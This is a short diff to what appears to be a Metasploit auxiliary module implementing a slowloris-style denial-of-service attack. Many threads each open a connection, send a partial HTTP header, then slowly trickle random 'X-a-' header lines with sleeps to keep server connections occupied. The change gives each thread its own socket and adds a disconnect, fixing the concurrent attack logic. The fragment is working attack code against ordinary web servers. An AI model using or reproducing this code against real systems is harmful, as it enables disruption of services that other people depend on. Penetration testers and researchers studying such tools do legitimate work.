@@ -60,13 +60,14 @@ class MetasploitModule < Msf::Auxiliary
         1.upto(thread_count) do |i|
           threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
             begin
-              connect()
-              sock.puts(header)
+              current_sock = connect(global=false)
+              current_sock.puts(header)
               headers.times do
                 data = "X-a-#{rand(0..1000)}: b\r\n"
-                sock.puts(data)
+                current_sock.puts(data)
                 sleep rand(1..timeout)
               end
+              disconnect(nsock=current_sock)
             end
           end
         end
